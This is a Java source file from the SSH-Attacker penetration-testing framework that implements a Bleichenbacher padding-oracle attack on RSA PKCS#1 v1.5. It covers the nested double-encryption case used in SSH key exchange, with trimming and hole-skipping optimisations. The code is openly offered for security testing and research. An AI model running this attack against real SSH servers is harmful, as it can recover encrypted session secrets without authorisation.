/*
 * SSH-Attacker - A Modular Penetration Testing Framework for SSH
 *
 * Copyright 2014-2023 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
 *
 * Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.sshattacker.attacks.pkcs1;

import static de.rub.nds.sshattacker.attacks.pkcs1.util.MathHelper.ceil;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.sshattacker.attacks.pkcs1.oracles.Pkcs1Oracle;
import de.rub.nds.sshattacker.attacks.pkcs1.util.MathHelper;
import de.rub.nds.sshattacker.attacks.pkcs1.util.PkcsConverter;
import de.rub.nds.sshattacker.attacks.pkcs1.util.TrimmerGenerator;
import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPublicKey;
import java.math.BigInteger;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Bleichenbacher extends Pkcs1Attack {

    private static final Logger LOGGER = LogManager.getLogger();
    // private MathHelper mathHelper = new MathHelper();
    private final CustomRsaPublicKey hostPublicKey;
    private final CustomRsaPublicKey serverPublicKey;

    private final BigInteger big_two = BigInteger.valueOf(2);

    private BigInteger B = null;
    private BigInteger two_B = null;
    private BigInteger three_B = null;
    private BigInteger three_B_sub_one = null;
    private BigInteger three_B_plus_one = null;

    private int counterInnerBleichenbacher;
    private int counterOuterBleichenbacher;

    private boolean innerTrimmed = false;
    private boolean outerTrimmed = false;
    private static final int innerTrimmers = 1500;
    private static final int outerTrimmers = 500;

    private boolean classic = false;

    /**
     * @param msg The message that should be decrypted with the attack
     * @param pkcsOracle The oracle to be queried
     */
    public Bleichenbacher(
            byte[] msg,
            Pkcs1Oracle pkcsOracle,
            CustomRsaPublicKey hostPublicKey,
            CustomRsaPublicKey serverPublicKey) {
        super(msg, pkcsOracle);
        this.hostPublicKey = hostPublicKey;
        this.serverPublicKey = serverPublicKey;
        counterInnerBleichenbacher = 0;
        counterOuterBleichenbacher = 0;
    }

    /**
     * Perform the step 2a of the Bleichenbacher Attack inkl. Skipping holes and Trimming
     * improvements from Bardou.
     *
     * @param lowerBound the lower bound value
     * @param ciphertext the ciphertext to manipulate
     * @param rsaPublicKey the RSA public key
     * @param outerKey the outer key
     * @param M the list of intervals
     * @return the final result of step 2a
     */
    private BigInteger step2a(
            BigInteger lowerBound,
            byte[] ciphertext,
            CustomRsaPublicKey rsaPublicKey,
            CustomRsaPublicKey outerKey,
            List<Interval> M) {

        BigInteger s = lowerBound;
        boolean oracleResult;
        BigInteger high = null, low = null, j = BigInteger.ONE;

        if (!classic) {
            // ceil(3*B+j*n,a)
            low = ceil(three_B.add(j.multiply(rsaPublicKey.getModulus())), M.get(0).lower);

            // ceil(2*B+(j+1)*n,b)-1
            high =
                    ceil(
                            two_B.add((j.add(BigInteger.ONE).multiply(rsaPublicKey.getModulus()))),
                            M.get(0).upper);

            high = high.subtract(BigInteger.ONE);
        }

        while (true) {
            // only skip holes in improved version
            if (!classic) {
                if (j.compareTo(BigInteger.ZERO) > 0) {
                    BigInteger[] result = checkAndSkipS(s, j, low, high, rsaPublicKey, M.get(0));
                    s = result[0];
                    j = result[1];
                    high = result[2];
                    low = result[3];
                }
            }

            BigInteger attempt =
                    manipulateCiphertext(
                            s,
                            rsaPublicKey.getPublicExponent(),
                            rsaPublicKey.getModulus(),
                            ciphertext);

            if (outerKey != null) {
                BigInteger encryptedAttempt = encryptBigInt(attempt, outerKey);

                oracleResult = queryOracle(encryptedAttempt, true);
                counterInnerBleichenbacher++;

            } else {
                oracleResult = queryOracle(attempt, false);

                if (counterOuterBleichenbacher == 0) {
                    LOGGER.fatal("first");
                    LOGGER.fatal(
                            ArrayConverter.bytesToHexString(
                                    ArrayConverter.bigIntegerToByteArray(attempt)));
                }
                counterOuterBleichenbacher++;
            }
            if (oracleResult) {
                LOGGER.fatal("2a");
                LOGGER.fatal(
                        ArrayConverter.bytesToHexString(
                                ArrayConverter.bigIntegerToByteArray(attempt)));
                return s;
            }

            s = s.add(BigInteger.ONE);
        }
    }

    /**
     * Searches the smallest suitable s-value for the inner encryption of a nested (double
     * encrypted) BB-Attack.
     *
     * <p>Implements Step 2b without parallel threats
     *
     * @param lowerBound The smallest value where it makes sens to start searching
     * @param ciphertext the ciphertext which should be checked against
     * @param rsaPublicKey the public-key to the ciphertext, which should be used to encrypt
     * @param outerKey the rsa-public-key for the outer encryption, encrypting the generated s-value
     * @return the smallest s-value, which generates a valid PKCS#1 Ciphertext
     */
    private BigInteger step2b(
            BigInteger lowerBound,
            byte[] ciphertext,
            CustomRsaPublicKey rsaPublicKey,
            CustomRsaPublicKey outerKey) {

        BigInteger s = lowerBound;
        boolean oracleResult;

        while (true) {
            BigInteger attempt =
                    manipulateCiphertext(
                            s,
                            rsaPublicKey.getPublicExponent(),
                            rsaPublicKey.getModulus(),
                            ciphertext);

            if (outerKey != null) {
                BigInteger encryptedAttempt = encryptBigInt(attempt, outerKey);

                oracleResult = queryOracle(encryptedAttempt, true);
                counterInnerBleichenbacher++;

            } else {
                oracleResult = queryOracle(attempt, false);

                if (counterOuterBleichenbacher == 0) {
                    LOGGER.fatal("first");
                    LOGGER.fatal(
                            ArrayConverter.bytesToHexString(
                                    ArrayConverter.bigIntegerToByteArray(attempt)));
                }
                counterOuterBleichenbacher++;
            }
            if (oracleResult) {
                LOGGER.fatal("2b");
                LOGGER.fatal(
                        ArrayConverter.bytesToHexString(
                                ArrayConverter.bigIntegerToByteArray(attempt)));
                return s;
            }

            s = s.add(BigInteger.ONE);
        }
    }

    /**
     * Generates the state for the Bleichenbacher attack Step 2B with single Calls to 2C.
     *
     * @param M The intervals as mentioned in the Bleichenbacher paper.
     * @param previousS The previous value of 's' used in the attack.
     * @param rsaPublicKey The RSA public key used in the attack.
     * @return The state as an ArrayList of arrays of BigIntegers.
     */
    private ArrayList<BigInteger[]> genState(
            List<Interval> M, BigInteger previousS, CustomRsaPublicKey rsaPublicKey) {

        // Saving s and r in States
        ArrayList<BigInteger[]> state = new ArrayList<>();

        for (Interval chosenInterval : M) {
            BigInteger upperBound = chosenInterval.getUpper();
            BigInteger bTimesPrevS = upperBound.multiply(previousS);
            BigInteger bTimePrevsSubTwoB = bTimesPrevS.subtract(two_B);
            // r = ceil(2 * b * (s-1) - 2B, n)
            BigInteger ri = ceil(big_two.multiply(bTimePrevsSubTwoB), rsaPublicKey.getModulus());

            BigInteger rITimesN = ri.multiply(rsaPublicKey.getModulus());

            // s = ceil(2B + r*n, b)
            BigInteger si_lower = ceil(two_B.add(rITimesN), upperBound);
            state.add(new BigInteger[] {si_lower, ri});
        }

        return state;
    }

    /**
     * Searches the smallest suitable s-value for the inner encryption of a nested (double
     * encrypted) BB-Attack.
     *
     * <p>Implements Step 2b parallel threats improvement from klima
     *
     * @param ciphertext the ciphertext which should be checked against
     * @param rsaPublicKey the public-key to the ciphertext, which should be used to encrypt
     * @param outerKey the rsa-public-key for the outer encryption, encrypting the generated s-value
     * @return the smallest s-value, which generates a valid PKCS#1 Ciphertext
     */
    private BigInteger step2b(
            List<Interval> M,
            BigInteger previousS,
            byte[] ciphertext,
            CustomRsaPublicKey rsaPublicKey,
            CustomRsaPublicKey outerKey) {
        LOGGER.info("RUNNING Step 2b");

        LOGGER.info("the array has {} items", M.size());

        ArrayList<BigInteger[]> states;
        states = genState(M, previousS, rsaPublicKey);

        while (true) {
            for (int i = 0; i < M.size(); i++) {
                BigInteger lower = M.get(i).lower;
                BigInteger upper = M.get(i).upper;

                // reading saved values from state
                BigInteger currentS = states.get(i)[0];
                BigInteger r = states.get(i)[1];

                // running a single 2c step and get result as array
                BigInteger[] results =
                        step2cSingle(lower, upper, currentS, r, ciphertext, rsaPublicKey, outerKey);

                BigInteger success = results[0];
                currentS = results[1];
                r = results[2];

                if (success.compareTo(BigInteger.ONE) == 0) {
                    // return s because of correct s value
                    return currentS;
                } else {
                    // Save back state
                    states.get(i)[0] = currentS;
                    states.get(i)[1] = r;
                }
            }
        }
    }

    /**
     * Searches for a valid s-value as part of the paralle threats method from klima, pretending
     * only one interval was found to search for the next s-value
     *
     * @param lowerBound the lower bound for the possible s-values
     * @param upperBound the upper boud for the possible s-values
     * @param ciphertext the ciphertext, for which the s-values should be found
     * @param rsaPublicKey the public-key for which the s-values should be found
     * @param outerKey the outer encryption key
     * @return BigInteger[] with: 0 / 1 if failed or success, the tests s-value and the used r value
     */
    private BigInteger[] step2cSingle(
            BigInteger lowerBound,
            BigInteger upperBound,
            BigInteger currentS,
            BigInteger r,
            byte[] ciphertext,
            CustomRsaPublicKey rsaPublicKey,
            CustomRsaPublicKey outerKey) {

        boolean oracleResult;

        BigInteger rITimesN = r.multiply(rsaPublicKey.getModulus());
        BigInteger si_upper = ceil(three_B.add(rITimesN), lowerBound);

        LOGGER.info("Startin");

        while (currentS.compareTo(si_upper) > 0) {
            r = r.add(BigInteger.ONE);
            rITimesN = r.multiply(rsaPublicKey.getModulus());
            currentS = ceil(two_B.add(rITimesN), upperBound);
            si_upper = ceil(three_B.add(rITimesN), lowerBound);
        }

        LOGGER.info("having good s");

        BigInteger attempt =
                manipulateCiphertext(
                        currentS,
                        rsaPublicKey.getPublicExponent(),
                        rsaPublicKey.getModulus(),
                        ciphertext);

        LOGGER.info("Manipulated Successfull");

        if (outerKey != null) {
            BigInteger encryptedAttempt = encryptBigInt(attempt, outerKey);
            oracleResult = queryOracle(encryptedAttempt, true);
            counterInnerBleichenbacher++;
        } else {
            oracleResult = queryOracle(attempt, false);
            counterOuterBleichenbacher++;
        }

        LOGGER.info("Querried Oracle");

        if (oracleResult) {
            LOGGER.debug("Successfull");
            return new BigInteger[] {BigInteger.ONE, currentS, r};
        } else {
            LOGGER.debug("Failed");
            return new BigInteger[] {BigInteger.ZERO, currentS.add(BigInteger.ONE), r};
        }
    }

    /**
     * Searches for a valid s-value in a given range of possible s-values for the inner encryption
     * of a nested (double encrypted) BB-Attack
     *
     * @param lowerBound the lower bound for the possible s-values
     * @param upperBound the upper boud for the possible s-values
     * @param previousS the last s which was found,
     * @param ciphertext the ciphertext, for which the s-values should be found
     * @param rsaPublicKey the public-key for which the s-values should be found
     * @param outerKey the outer encryption key
     * @return the found s-value
     */
    private BigInteger step2c(
            BigInteger lowerBound,
            BigInteger upperBound,
            BigInteger previousS,
            byte[] ciphertext,
            CustomRsaPublicKey rsaPublicKey,
            CustomRsaPublicKey outerKey) {

        boolean oracleResult;
        //  ri = ceil(2 * (b * prev_s - 2 * B), n)
        BigInteger bTimesPrevs = upperBound.multiply(previousS);
        BigInteger bTimePrevsSubTwoB = bTimesPrevs.subtract(two_B);
        BigInteger ri = ceil(big_two.multiply(bTimePrevsSubTwoB), rsaPublicKey.getModulus());

        while (true) {

            // si_lower = ceil(2 * B + ri * n, b)
            // si_upper = ceil(3 * B + ri * n, a)
            BigInteger rITimesN = ri.multiply(rsaPublicKey.getModulus());
            BigInteger si_lower = ceil(two_B.add(rITimesN), upperBound);
            BigInteger si_upper = ceil(three_B.add(rITimesN), lowerBound);

            for (BigInteger si = si_lower;
                    si.compareTo(si_upper) < 0;
                    si = si.add(BigInteger.ONE)) {

                BigInteger attempt =
                        manipulateCiphertext(
                                si,
                                rsaPublicKey.getPublicExponent(),
                                rsaPublicKey.getModulus(),
                                ciphertext);

                if (outerKey != null) {
                    BigInteger encryptedAttempt = encryptBigInt(attempt, outerKey);
                    oracleResult = queryOracle(encryptedAttempt, true);
                    counterInnerBleichenbacher++;
                } else {
                    oracleResult = queryOracle(attempt, false);
                    counterOuterBleichenbacher++;
                }

                if (oracleResult) {
                    return si;
                }
            }

            ri = ri.add(BigInteger.ONE);
        }
    }

    /**
     * Inserts a newly found interval into the known intervals M at the correct position
     *
     * @param M the known intervals of the previous attack-steps
     * @param intervalToInsert the newly found interval, which should be inserted
     * @return the new Intervall M
     */
    static List<Interval> safeIntervalInsert(List<Interval> M, Interval intervalToInsert) {
        for (int i = 0; i < M.size(); i++) {
            Interval chosenInterval = M.get(i);

            if (chosenInterval.upper.compareTo(intervalToInsert.lower) >= 0
                    && chosenInterval.lower.compareTo(intervalToInsert.upper) <= 0) {
                BigInteger lb = chosenInterval.lower.min(intervalToInsert.lower);
                BigInteger ub = chosenInterval.upper.max(intervalToInsert.upper);
                M.set(i, new Interval(lb, ub));
                return M;
            }
        }

        M.add(intervalToInsert);
        return M;
    }

    /**
     * Searches for the next intervals given by the found s-value for the BB-Attack
     *
     * @param M the previoud found Intervals
     * @param s the found s-value which generates a valid PCKS-Padding
     * @param rsaPublicKey the public key, for which the ciphertext should be decrypted
     * @return the new Intervall M
     */
    private List<Interval> updateInterval(
            List<Interval> M, BigInteger s, CustomRsaPublicKey rsaPublicKey) {
        List<Interval> M_new = new ArrayList<>();
        for (Interval chosenInterval : M) {
            /*
                a * s - 3 * B + 1
            */
            BigInteger lowerTimesS = chosenInterval.lower.multiply(s);
            BigInteger lowerPartForCeil = lowerTimesS.subtract(three_B_plus_one);

            BigInteger r_lower = ceil(lowerPartForCeil, rsaPublicKey.getModulus());

            /*
                b * s - 2 * B
            */
            BigInteger upperTimesS = chosenInterval.upper.multiply(s);
            BigInteger upperPartForCeil = upperTimesS.subtract(two_B);
            BigInteger r_upper = ceil(upperPartForCeil, rsaPublicKey.getModulus());

            for (BigInteger r = r_lower; r.compareTo(r_upper) < 0; r = r.add(BigInteger.ONE)) {
                BigInteger lowerBound = chosenInterval.lower;
                BigInteger upperBound = chosenInterval.upper;

                BigInteger lowerUpperBound =
                        ceil(two_B.add(r.multiply(rsaPublicKey.getModulus())), s);
                lowerBound = lowerBound.max(lowerUpperBound);

                BigInteger upperUpperBound =
                        MathHelper.floor(
                                three_B_sub_one.add(r.multiply(rsaPublicKey.getModulus())), s);
                upperBound = upperBound.min(upperUpperBound);

                Interval interim_interval = new Interval(lowerBound, upperBound);

                M_new = safeIntervalInsert(M_new, interim_interval);
            }
        }

        return M_new;
    }

    /** The function to start the Attack */
    public void attack(boolean classic) {

        this.classic = classic;

        if (hostPublicKey.getModulus().bitLength() > serverPublicKey.getModulus().bitLength()) {
            byte[] cracked = nestedBleichenbacher(encryptedMsg, serverPublicKey, hostPublicKey);
            LOGGER.info("Cracked encoded: {}", ArrayConverter.bytesToHexString(cracked));
            byte[] cracked_decoded = PkcsConverter.doPkcsDecoding(cracked);
            LOGGER.info("Cracked decoded: {}", ArrayConverter.bytesToHexString(cracked_decoded));
            solution = new BigInteger(cracked_decoded);
        } else {
            byte[] cracked = nestedBleichenbacher(encryptedMsg, serverPublicKey, hostPublicKey);
            LOGGER.info("Cracked encoded: {}", ArrayConverter.bytesToHexString(cracked));
            byte[] cracked_decoded = PkcsConverter.doPkcsDecoding(cracked);
            LOGGER.info("Cracked decoded: {}", ArrayConverter.bytesToHexString(cracked_decoded));
            solution = new BigInteger(cracked_decoded);
        }
    }

    /**
     * The Bleichenbacher-Attack for a nested encryption. The Encryption is: (outerkey ( innerkey (
     * ciphertext)))
     *
     * @param ciphertext The Ciphertext, which should be decrypted
     * @param innerPublicKey The known public key, for the inner encryption for the ciphertext
     * @param outerPublicKey The known public key, for the outer encryption for the ciphertext
     * @return the decrypted Plaintext
     */
    private byte[] nestedBleichenbacher(
            byte[] ciphertext,
            CustomRsaPublicKey innerPublicKey,
            CustomRsaPublicKey outerPublicKey) {
        int innerBitsize = innerPublicKey.getModulus().bitLength();
        int outerBitsize = outerPublicKey.getModulus().bitLength();
        int innerK = innerBitsize / 8;
        int outerK = outerBitsize / 8;

        B = big_two.pow(8 * (outerK - 2));
        two_B = B.multiply(big_two);
        three_B = B.multiply(BigInteger.valueOf(3));
        three_B_sub_one = three_B.subtract(BigInteger.ONE);
        three_B_plus_one = three_B.add(BigInteger.ONE);

        byte[] encoded_inner_ciphertext = Bleichenbacher(ciphertext, outerPublicKey, null);
        byte[] innerCiphertext = PkcsConverter.doPkcsDecoding(encoded_inner_ciphertext);

        B = big_two.pow(8 * (innerK - 2));
        two_B = B.multiply(big_two);
        three_B = B.multiply(BigInteger.valueOf(3));
        three_B_sub_one = three_B.subtract(BigInteger.ONE);
        three_B_plus_one = three_B.add(BigInteger.ONE);

        return Bleichenbacher(innerCiphertext, innerPublicKey, outerPublicKey);
    }

    /**
     * Perform the inner Bleichenbacher algorithm.
     *
     * @param ciphertext The ciphertext to decrypt.
     * @param innerPublicKey The inner RSA public key.
     * @param outerPublicKey The outer RSA public key.
     * @return The decrypted plaintext as a byte array.
     */
    private byte[] Bleichenbacher(
            byte[] ciphertext,
            CustomRsaPublicKey innerPublicKey,
            CustomRsaPublicKey outerPublicKey) {

        int innerBitsize = innerPublicKey.getModulus().bitLength();
        int innerK = innerBitsize / 8;
        BigInteger s;

        LOGGER.debug(
                "bitsize: {}\nk: {}\nB: {}\n2B: {}\n3B: {}\n3B - 1: {}\nCiphertext: {}",
                innerBitsize,
                innerK,
                B.toString(16),
                two_B.toString(16),
                three_B.toString(16),
                three_B_sub_one.toString(16),
                bytesToHex(ciphertext));

        List<Interval> M = new ArrayList<>();
        M.add(new Interval(two_B, three_B_sub_one));
        LOGGER.debug(
                "M lower: {} M upper: {}",
                M.get(0).lower.toString(16),
                M.get(0).upper.toString(16));

        // only applie trimmes in improved run
        if (!classic) {
            int maxTrimmes = outerPublicKey != null ? innerTrimmers : outerTrimmers;

            M = trimM0(ciphertext, innerPublicKey, outerPublicKey, maxTrimmes);
        }

        s =
                step2a(
                        ceil(innerPublicKey.getModulus().add(two_B), M.get(0).upper),
                        ciphertext,
                        innerPublicKey,
                        outerPublicKey,
                        M);

        LOGGER.debug(
                "found s, initial updating M lower: {} M upper: {}",
                M.get(0).lower.toString(16),
                M.get(0).upper.toString(16));

        M = updateInterval(M, s, innerPublicKey);
        LOGGER.debug("Length: {} M: {}", M.size(), M.toString());

        while (true) {
            if (M.size() >= 2) {

                if (!classic) {
                    s =
                            step2b(
                                    M,
                                    s.add(BigInteger.ONE),
                                    ciphertext,
                                    innerPublicKey,
                                    outerPublicKey);
                } else {
                    s = step2b(s.add(BigInteger.ONE), ciphertext, innerPublicKey, outerPublicKey);
                }

            } else if (M.size() == 1) {
                BigInteger a = M.get(0).lower;
                BigInteger b = M.get(0).upper;
                if (a.equals(b)) {
                    return ArrayConverter.bigIntegerToByteArray(a);
                }
                s = step2c(a, b, s, ciphertext, innerPublicKey, outerPublicKey);
            }
            M = updateInterval(M, s, innerPublicKey);
        }
    }

    /**
     * Implements "Skipping Holes" from Bardou, tests if s may be valid, returns if true or skips to
     * the next valid s if false
     *
     * @param s The value to be checked.
     * @param j Incrementor for the Holes
     * @param low The lower bound of the range.
     * @param high The upper bound of the range.
     * @return The updated value of 's' to be used in the next iteration.
     */
    private BigInteger[] checkAndSkipS(
            BigInteger s,
            BigInteger j,
            BigInteger low,
            BigInteger high,
            CustomRsaPublicKey publicKey,
            Interval M) {
        while (true) {
            if (s.compareTo(low) >= 0 && s.compareTo(high) <= 0) {
                s = high.add(BigInteger.ONE);
            } else if (low.compareTo(high) > 0) {
                LOGGER.info("thats it - no more holes");
                return new BigInteger[] {s, BigInteger.ZERO, BigInteger.ZERO, BigInteger.ZERO};
            } else if (s.compareTo(low) < 0) {
                return new BigInteger[] {s, j, high, low};
            }
            j = j.add(BigInteger.ONE);
            low = ceil(three_B.add(j.multiply(publicKey.getModulus())), M.lower); // ceil(3*B+j*n,a)
            high =
                    ceil(
                                    two_B.add(
                                            (j.add(BigInteger.ONE)
                                                    .multiply(publicKey.getModulus()))),
                                    M.upper)
                            .subtract(BigInteger.ONE); // ceil(2*B+(j+1)*n,b)-1

            LOGGER.info("Skipping {} Values", high.subtract(low).intValue());
        }
    }

    private List<Interval> trimM0(
            byte[] ciphertext,
            CustomRsaPublicKey innerPublicKey,
            CustomRsaPublicKey outerPublicKey,
            int maxTrimmers) {
        TrimmerGenerator trimmerGenerator = new TrimmerGenerator();

        List<Interval> M;

        ArrayList<int[]> trimmers;
        trimmers = trimmerGenerator.getPaires(maxTrimmers);
        ArrayList<int[]> utPairs = new ArrayList<>();

        for (int[] ut : trimmers) {
            int u = ut[0];
            int t = ut[1];

            BigInteger uBI = BigInteger.valueOf(u);
            BigInteger tBI = BigInteger.valueOf(t);

            BigInteger cipherbig = new BigInteger(1, ciphertext);

            BigInteger result =
                    cipherbig
                            .multiply(
                                    (uBI.multiply(tBI.modInverse(innerPublicKey.getModulus())))
                                            .modPow(
                                                    innerPublicKey.getPublicExponent(),
                                                    innerPublicKey.getModulus()))
                            .mod(innerPublicKey.getModulus());
            if (outerPublicKey != null) {
                BigInteger encryptedAttempt = encryptBigInt(result, outerPublicKey);

                if (queryOracle(
                        encryptedAttempt,
                        true)) { // assuming the oracle and util method exists and does what
                    // expected
                    utPairs.add(new int[] {u, t});
                }
            } else {
                if (queryOracle(result, false)) {
                    utPairs.add(new int[] {u, t});
                }
            }
        }

        if (!utPairs.isEmpty()) {

            ArrayList<Integer> t_values = new ArrayList<>();
            for (int[] pair : utPairs) {
                t_values.add(pair[1]);
            }

            int t_prime = MathHelper.findLeastCommonMultiple(t_values);

            int u_min = Integer.MAX_VALUE;
            int u_max = Integer.MIN_VALUE;
            for (int[] pair : utPairs) {
                int current = pair[0] * t_prime / pair[1];
                if (current < u_min) {
                    u_min = current;
                }
                if (current > u_max) {
                    u_max = current;
                }
            }

            BigInteger a =
                    two_B.multiply(BigInteger.valueOf(t_prime)).divide(BigInteger.valueOf(u_min));
            BigInteger b =
                    three_B_sub_one
                            .multiply(BigInteger.valueOf(t_prime))
                            .divide(BigInteger.valueOf(u_max));

            M = new ArrayList<>();
            M.add(new Interval(a, b));
            LOGGER.debug("done. trimming M0 iterations: [{},{}]", a, b);

            if (outerPublicKey != null) {
                innerTrimmed = true;
            } else {
                outerTrimmed = true;
            }

        } else {
            LOGGER.debug("utPaires where empty, falling back to 2B and 3B-1");
            M = new ArrayList<>();
            M.add(new Interval(two_B, three_B_sub_one));
        }
        return M;
    }

    /**
     * A helper function to create a hex-string from bytes
     *
     * @param bytes The bytes, which should be returned as hex-string
     * @return The hex-string for the given Bytes
     */
    private String bytesToHex(byte[] bytes) {
        StringBuilder result = new StringBuilder();
        for (byte b : bytes) {
            result.append(String.format("%02x", b));
        }
        return result.toString();
    }

    /**
     * A helper function to encrypt a given BB-Attempt with a PCKS#1-Padding and a RSA encryption
     *
     * @param attempt The "plain" BB-Attempt, which should be encrypted
     * @param encryptionKey The encryption-Key for the attempt
     * @return
     */
    private BigInteger encryptBigInt(BigInteger attempt, CustomRsaPublicKey encryptionKey) {
        try {
            Cipher javaCipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");

            javaCipher.init(Cipher.ENCRYPT_MODE, encryptionKey);

            return new BigInteger(
                    javaCipher.doFinal(ArrayConverter.bigIntegerToByteArray(attempt)));

        } catch (InvalidKeyException
                | IllegalBlockSizeException
                | BadPaddingException
                | NoSuchPaddingException
                | NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }
    }

    /**
     * Manipulates the ciphertext by performing the following steps: 1. Computes the exponentiated
     * value of s using the public exponent e and modulus n. 2. Converts the ciphertext array c to a
     * BigInteger cipher. 3. Multiplies cipher with exponentiated and stores the result in res. 4.
     * Computes the modulus of res with n and returns the result.
     *
     * @param s The value to be exponentiated.
     * @param e The public exponent.
     * @param n The modulus.
     * @param c The ciphertext as a byte array.
     * @return The manipulated ciphertext as a BigInteger.
     */
    private BigInteger manipulateCiphertext(BigInteger s, BigInteger e, BigInteger n, byte[] c) {
        BigInteger exponentiated = s.modPow(e, n);
        BigInteger cipher = new BigInteger(1, c);
        BigInteger res = cipher.multiply(exponentiated);

        return res.mod(n);
    }

    /*
     * Collect all getters for stats down here
     */
    public int getCounterInnerBleichenbacher() {
        return counterInnerBleichenbacher;
    }

    public int getCounterOuterBleichenbacher() {
        return counterOuterBleichenbacher;
    }

    public boolean isInnerTrimmed() {
        return innerTrimmed;
    }

    public boolean isOuterTrimmed() {
        return outerTrimmed;
    }

    public int getInnerTrimmers() {
        return innerTrimmers;
    }

    public int getOuterTrimmers() {
        return outerTrimmers;
    }
}
